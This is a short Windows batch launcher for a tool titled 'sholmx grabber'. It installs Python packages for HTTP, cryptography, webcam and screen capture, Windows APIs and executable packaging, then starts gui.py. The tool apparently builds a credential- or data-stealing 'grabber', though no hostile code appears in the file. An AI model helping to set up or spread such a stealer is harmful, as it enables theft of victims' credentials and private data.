@echo off
title sholmx grabber KEEP THIS OPEN
cd /d "%~dp0"

echo Installing required Python packages...
python -m pip install --upgrade pip
python -m pip install requests customtkinter pycryptodome opencv-python pyautogui pypiwin32 pyinstaller

echo Installation complete. Starting GUI...
python gui.py
exit
